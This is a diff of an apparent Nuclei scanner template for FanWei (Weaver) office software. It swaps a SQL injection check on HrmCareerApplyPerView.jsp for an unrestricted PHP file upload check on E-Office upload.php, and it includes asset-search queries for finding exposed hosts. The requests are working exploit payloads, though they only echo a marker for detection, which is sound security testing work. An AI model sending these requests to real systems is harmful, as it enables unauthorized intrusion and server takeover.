@@ -1,29 +1,52 @@
 id: FanWei
 
-
 info:
-  name: FanWei HrmCareerApplyPerView SQL Injection Vulnerability
+  name: FanWei Micro OA E-Office upload.php Arbitrary File Upload Vulnerability
   author: Zero Trust Security Attack and Defense Laboratory
   severity: high
   description: |
-     FanWei There is a HrmCareerApplyPerView SQL injection vulnerability that hackers can use to obtain sensitive information-
+    FanWei E-Office uploads files in upload.php without strict filtering, which allows unrestricted file uploading. Attackers can directly obtain website permissions through this vulnerability
   metadata:
-    fofa-query: app="泛微-协同办公OA"
-    hunter-query: web.title="泛微-协同办公OA"
+    fofa-query: app="泛微-EOffice"
+    hunter-query: web.title="泛微软件"
 
+
+variables:
+  str1: '{{rand_base(6)}}'
+  str2: '{{rand_base(6)}}'
 
 http:
   - raw:
       - |
-          GET /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%271%27)),db_name(1),5,6,7 HTTP/1.1
-          Host: {{Hostname}}
-          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)
-          Accept-Encoding: gzip, deflate
-          Connection: close
+        POST /webservice/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryakbyiukl
+        Accept-Encoding: gzip
+        Connection: close
 
-    req-condition: true
+        ------WebKitFormBoundaryakbyiukl
+        Content-Disposition: form-data; name="file"; filename="a.php4"
+        Content-Type: application/octet-stream
+
+        <?php echo "{{str2}}";?>
+        ------WebKitFormBoundaryakbyiukl--
+
+      - |
+        GET /attachment/{{replace(name,"*","/")}}.php4 HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: name
+        group: 1
+        regex:
+          - '([/*0-9a-zA-Z]+)\.php4$'
+        internal: true
+
     matchers:
       - type: dsl
         dsl:
-          - 'contains(body_1, "c4ca")'
-        condition: and
+          - body_2 == str2
+
+# http://your-ip/attachment/回显的那串数字/a.php4
